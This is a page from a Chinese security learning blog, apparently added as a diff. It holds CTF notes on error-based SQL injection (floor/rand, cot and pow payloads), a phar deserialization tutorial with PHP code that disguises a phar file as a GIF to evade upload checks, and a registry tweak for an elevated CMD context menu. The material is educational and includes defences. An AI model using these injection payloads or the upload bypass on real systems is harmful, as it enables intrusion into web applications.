+<h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h3><p> <strong>floor()报错注入准确地说应该是floor,count,group by冲突报错</strong> </p>
+<pre class="line-numbers language-SQL"><code class="language-SQL">select count(*) ,concat(database(),floor(rand(0)*2))x from users group by x
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/Web/">Web</a>, <a href="/categories/Web/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Web/">Web</a>, <a href="/tags/笔记/">笔记</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2019-09-22T08:10:40.000Z"><a href="/2019/09/22/phar反序列化漏洞利用/">2019-09-22</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2019/09/22/phar反序列化漏洞利用/">phar反序列化漏洞利用</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p> Phar反序列化漏洞是一种较新的攻击向量，用于针对面向对象的PHP应用程序执行代码重用攻击，该攻击方式在Black Hat 2018会议上由安全研究员Sam Thomas公开披露。类似于对编译二进制文件的ROP（Return-oriented Programming）攻击，这种类型的漏洞利用PHP对象注入（POI），这是面向对象的PHP代码上下文中的一种面向属性的编程（POP）。</p>
+<p> 利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。这让一些看起来“人畜无害”的函数变得“暗藏杀机”，下面我们就来了解一下这种攻击手法。</p>
+<h1 id="什么是Phar文件？"><a href="#什么是Phar文件？" class="headerlink" title="什么是Phar文件？"></a>什么是Phar文件？</h1><p>phar (PHP Archive) 是PHP里类似于Java中jar的一种打包文件，用于归档。当PHP 版本&gt;=5.3时默认开启支持PHAR文件的。</p>
+<p>phar文件默认状态是只读，使用phar文件不需要任何的配置。</p>
+<p>而phar://伪协议即PHP归档，用来解析phar文件内容。</p>
+<p><strong>通过查阅手册可知一个phar文件有四部分构成：</strong></p>
+<h2 id="1-stub"><a href="#1-stub" class="headerlink" title="1. stub"></a>1. stub</h2><p>一个供phar扩展用于识别的标志，格式为xxx&lt;?php xxx; <strong>HALT_COMPILER();?&gt;，前面内容不限，但必须以</strong>HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<h2 id="2-manifest"><a href="#2-manifest" class="headerlink" title="2. manifest"></a>2. manifest</h2><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
+<p><img src="/2019/09/22/phar反序列化漏洞利用/1.png" alt="manifest"></p>
+<h2 id="3-contents"><a href="#3-contents" class="headerlink" title="3. contents"></a>3. contents</h2><p>被压缩文件的内容。</p>
+<h2 id="4-signature"><a href="#4-signature" class="headerlink" title="4. signature"></a>4. signature</h2><p>签名，放在文件末尾，格式如下：</p>
+<p><img src="/2019/09/22/phar反序列化漏洞利用/2.png" alt="signature"></p>
+<h1 id="phar-使用实例"><a href="#phar-使用实例" class="headerlink" title="phar 使用实例"></a>phar 使用实例</h1><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong><br><img src="/2019/09/22/phar反序列化漏洞利用/3.png" alt="关闭readonly"></p>
+<p><strong>index.php</strong></p>
+<pre class="line-numbers language-PHP"><code class="language-PHP"><?php
+    class Test {
+        var $test;
+        function __destruct(){
+            echo "hello";
+        }
+    }
+
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar"); //后缀名必须为phar
+    $phar->startBuffering();
+    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+    $o = new Test();
+    $phar->setMetadata($o); //将自定义的meta-data存入manifest
+    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
+    //签名自动计算
+    $phar->stopBuffering();
+?>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用winhax 打开可以看到phar文件里已经包含了我们要反序列化的内容<br><img src="/2019/09/22/phar反序列化漏洞利用/4.png" alt="phar文件"></p>
+<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="/2019/09/22/phar反序列化漏洞利用/5.png" alt="序列化"></p>
+<p>测试phar反序列化漏洞<br><strong>parse.php</strong></p>
+<pre class="line-numbers language-PHP"><code class="language-PHP">    class Test {
+        var $test;
+        function __destruct(){
+            echo "hello";
+        }
+    }
+/*
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar"); //后缀名必须为phar
+    $phar->startBuffering();
+    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+    $o = new Test();
+    $phar->setMetadata($o); //将自定义的meta-data存入manifest
+    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
+    //签名自动计算
+    $phar->stopBuffering();
+*/
+    $filename = 'phar://phar.phar';
+    file_exists($filename);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2019/09/22/phar反序列化漏洞利用/6.png" alt="漏洞利用"></p>
+<h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>php识别phar文件是通过其文件头的stub，即识别<strong>__HALT_COMPILER();?&gt;</strong>这段代码，对前面的内容是没有要求的，我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP"><?php
+    class Test {
+        var $test;
+        function __destruct(){
+            echo "hello";
+        }
+    }
+
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar");
+    $phar->startBuffering();
+    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
+    $o = new TestObject();
+    $phar->setMetadata($o); //将自定义meta-data存入manifest
+    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
+    //签名自动计算
+    $phar->stopBuffering();
+?>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行代码，生成phar.phar 文件，我们可以修改为任意后缀，例如gif，文件头部特征可以任意修改，但是<strong>__HALT_COMPILER(); ?&gt; </strong>这里不能变</p>
+<p>采用这种方法可以绕过很大一部分上传检测。</p>
+<h1 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h1><blockquote>
+<ul>
+<li>能上传文件道服务器</li>
+<li>有可以利用魔术方法的”跳板”,在本文中指的是<pre><code>function __destruct(){
+  echo &quot;hello&quot;;
+}
+</code></pre></li>
+<li>文件操作函数的参数可控，且:、/、phar等特殊字符未被过滤</li>
+</ul>
+</blockquote>
+<h1 id="漏洞底层源码"><a href="#漏洞底层源码" class="headerlink" title="漏洞底层源码"></a>漏洞底层源码</h1><p>在php-src/ext/phar/phar.c中可以查看到phar在解析metadata时会调用php_var_unserialize()函数来对metadata进行反序列化操作：<br><img src="/2019/09/22/phar反序列化漏洞利用/7.png" alt="底层"></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><blockquote>
+<ul>
+<li>在文件系统函数的参数可控时，对参数进行严格的过滤；</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>严格检查上传文件的内容，而不是只检查文件头；</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>在条件允许的情况下禁用可执行系统命令、代码的危险函数；</li>
+</ul>
+</blockquote>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/Web/">Web</a>, <a href="/tags/CTF/">CTF</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2019-04-26T15:32:00.000Z"><a href="/2019/04/26/SQL注入/">2019-04-26</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2019/04/26/SQL注入/">CTF 笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="SQL-中报错情况-可用于报错注入"><a href="#SQL-中报错情况-可用于报错注入" class="headerlink" title="SQL 中报错情况(可用于报错注入)"></a>SQL 中报错情况(可用于报错注入)</h1><blockquote>
+<ul>
+<li>测试 payload 如下:<br>username = admin’ union select cot(1 and left(database(),1)&gt;’a’);#<br>cot(0) 报错</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>pow()函数报错<br>pow(1,22222222)=1  ,pow(0,22222222) 会报错</li>
+</ul>
+</blockquote>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/Web/">Web</a>, <a href="/tags/笔记/">笔记</a>, <a href="/tags/CTF/">CTF</a>, <a href="/tags/SQL/">SQL</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-12-01T08:47:03.000Z"><a href="/2018/12/01/win10-右键打开CMD/">2018-12-01</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/12/01/win10-右键打开CMD/">win10 右键打开CMD</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>#实现win10 右键出现cmd菜单<br><img src="/2018/12/01/win10-右键打开CMD/1.png" alt="win10 右键打开CMD"></p>
+<h4 id="新建一个txt文件"><a href="#新建一个txt文件" class="headerlink" title="新建一个txt文件"></a><strong>新建一个txt文件</strong></h4><h4 id="输入代码如下："><a href="#输入代码如下：" class="headerlink" title="输入代码如下："></a>输入代码如下：</h4><pre><code>Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\Directory\shell\OpenCmdHere]
+@=&quot;CMD&quot;
+&quot;Icon&quot;=&quot;cmd.exe&quot;
+
+[HKEY_CLASSES_ROOT\Directory\shell\OpenCmdHere\command]
+@=&quot;PowerShell -windowstyle hidden -Command \&quot;Start-Process cmd.exe -ArgumentList &#39;/s,/k, pushd,%V&#39; -Verb RunAs\&quot;&quot;
+
+[HKEY_CLASSES_ROOT\Directory\Background\shell\OpenCmdHere]
+@=&quot;CMD&quot;
+&quot;Icon&quot;=&quot;cmd.exe&quot;
+
+[HKEY_CLASSES_ROOT\Directory\Background\shell\OpenCmdHere\command]
+@=&quot;PowerShell -windowstyle hidden -Command \&quot;Start-Process cmd.exe -ArgumentList &#39;/s,/k, pushd,%V&#39; -Verb RunAs\&quot;&quot;
+
+[HKEY_CLASSES_ROOT\Drive\shell\OpenCmdHere]
+@=&quot;CMD&quot;
+&quot;Icon&quot;=&quot;cmd.exe&quot;
+
+[HKEY_CLASSES_ROOT\Drive\shell\OpenCmdHere\command]
+@=&quot;PowerShell -windowstyle hidden -Command \&quot;Start-Process cmd.exe -ArgumentList &#39;/s,/k, pushd,%V&#39; -Verb RunAs\&quot;&quot;
+
+[HKEY_CLASSES_ROOT\LibraryFolder\background\shell\OpenCmdHere]
+@=&quot;CMD&quot;
+&quot;Icon&quot;=&quot;cmd.exe&quot;
+
+[HKEY_CLASSES_ROOT\LibraryFolder\background\shell\OpenCmdHere\command]
+@=&quot;PowerShell -windowstyle hidden -Command \&quot;Start-Process cmd.exe -ArgumentList &#39;/s,/k, pushd,%V&#39; -Verb RunAs\&quot;&quot;
+</code></pre><h4 id="保存修改文件后缀为-reg"><a href="#保存修改文件后缀为-reg" class="headerlink" title="保存修改文件后缀为 .reg"></a>保存修改文件后缀为 <strong>.reg</strong></h4><p>运行即可</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/扩展/">扩展</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+
+<nav id="pagination">
+  
+  <nav id="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
+
+</nav>
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:fakerye.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/CTF/">CTF</a><small>1</small></li>
+  
+    <li><a href="/categories/Web/">Web</a><small>3</small></li>
+  
+    <li><a href="/categories/CTF/Web/">Web</a><small>1</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/categories/Web/笔记/">笔记</a><small>3</small></li>
+  
+    <li><a href="/categories/安全/笔记/">笔记</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2020/02/04/20200204/">2020年2月04日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/02/01/20200201/">2020年2月01日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/29/20200129/">2020年1月29日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/15/20200115/">2020年1月15日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/14/20200114/">2020年1月14日学习笔记</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/CTF/">CTF</a><small>4</small></li>
+  
+    <li><a href="/tags/SQL/">SQL</a><small>1</small></li>
+  
+    <li><a href="/tags/Web/">Web</a><small>6</small></li>
+  
+    <li><a href="/tags/Writeup/">Writeup</a><small>1</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/tags/扩展/">扩展</a><small>1</small></li>
+  
+    <li><a href="/tags/笔记/">笔记</a><small>9</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">Tag Cloud</h3>
+  <div class="entry">
+    <a href="/tags/CTF/" style="font-size: 13.33px;">CTF</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/安全/" style="font-size: 13.33px;">安全</a> <a href="/tags/扩展/" style="font-size: 10px;">扩展</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2020 John Doe
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="bg"></div>
+</body>
+</html>
